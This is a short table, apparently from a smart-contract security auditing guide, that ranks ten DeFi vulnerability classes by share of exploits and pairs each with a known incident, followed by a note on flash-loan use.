| 1 | Oracle/Price Manipulation | 32% | Yes | Mango $117M |
| 2 | Logic Error / Business Logic | 28% | Often | Belt $6.2M |
| 3 | Access Control | 19% | No | Ronin $625M |
| 4 | Reentrancy | 8% | Sometimes | Curve $70M |
| 5 | Flash Loan + Governance | 4% | Yes | Beanstalk $182M |
| 6 | Integer Overflow/Underflow | 3% | Varies | Cetus $223M |
| 7 | Signature/Replay | 3% | No | Wormhole $320M |
| 8 | Fee-on-Transfer | 1% | Sometimes | various |
| 9 | ERC4626 Inflation | 1% | Usually | ResupplyFi $1.8M |
| 10 | Arbitrary External Call | 1% | No | LI.FI $10.7M |

**Key insight: 83% of successful exploits used flash loans (zero-cost capital).**

---

→ NEXT: [05-triage-report-examples.md](05-triage-report-examples.md)
